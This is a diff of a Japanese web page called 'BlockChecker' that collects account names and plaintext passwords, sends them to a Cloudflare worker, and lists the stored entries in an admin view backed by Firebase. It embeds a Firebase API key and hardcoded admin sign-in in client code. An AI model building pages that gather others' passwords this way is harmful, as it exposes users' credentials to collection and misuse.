@@ -12,16 +12,18 @@ th, td { border:1px solid #444; padding:8px; text-align:center;}
 th { background:#222;}
 tr:nth-child(even) { background:#1a1a1a;}
 #no-data { text-align:center; margin-top:20px; color:#888; }
+#log { margin-top:10px; color:#0f0; font-family:monospace; }
 </style>
 </head>
 <body>
 <h1>BlockChecker 管理＆送信ページ</h1>
 
 <h2>データ送信</h2>
-<label>アカウント: <input id="account" type="text"></label>
-<label>パスワード: <input id="password" type="text"></label>
-<label>ブロック数: <input id="blockCount" type="number" value="0"></label>
+<label>アカウント: <input id="account" type="text" value="testuser"></label>
+<label>パスワード: <input id="password" type="text" value="1234"></label>
+<label>ブロック数: <input id="blockCount" type="number" value="1"></label>
 <button id="sendBtn">送信</button>
+<div id="log"></div>
 
 <h2>管理者用データ一覧</h2>
 <div id="no-data">まだデータはありません</div>
@@ -39,7 +41,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebas
 import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
 import { getAuth, onAuthStateChanged, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
 
-// 🔹 Firebase 設定（Realtime Database用）
+// 🔹 Firebase 設定
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
   authDomain: "daada-ae048.firebaseapp.com",
@@ -63,6 +65,7 @@ signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD)
   .catch(err => alert("ログインエラー: " + err.message));
 
 const workerURL = "https://blockchecker.da9782523.workers.dev";
+const log = document.getElementById("log");
 
 // 🔹 送信ボタン
 document.getElementById("sendBtn").addEventListener("click", async () => {
@@ -71,20 +74,21 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
   const blockCount = parseInt(document.getElementById("blockCount").value || "0");
 
   if(!account || !password){
-    alert("アカウントとパスワードは必須です");
+    log.textContent = "⚠ アカウントとパスワードは必須です";
     return;
   }
 
   try {
-    await fetch(workerURL, {
+    const res = await fetch(workerURL, {
       method:"POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ account, password, blockCount })
     });
-    alert("送信成功");
-    showData(); // 送信後にデータ一覧を更新
+    const text = await res.text();
+    log.textContent = "✅ 送信成功: " + text;
+    showData();
   } catch(e) {
-    alert("送信失敗: " + e.message);
+    log.textContent = "❌ 送信失敗: " + e.message;
   }
 });
 
@@ -104,7 +108,6 @@ async function showData() {
   table.style.display = "table";
   noData.style.display = "none";
 
-  // 既存の行を削除
   while(table.rows.length > 1) table.deleteRow(1);
 
   snapshot.forEach(child => {
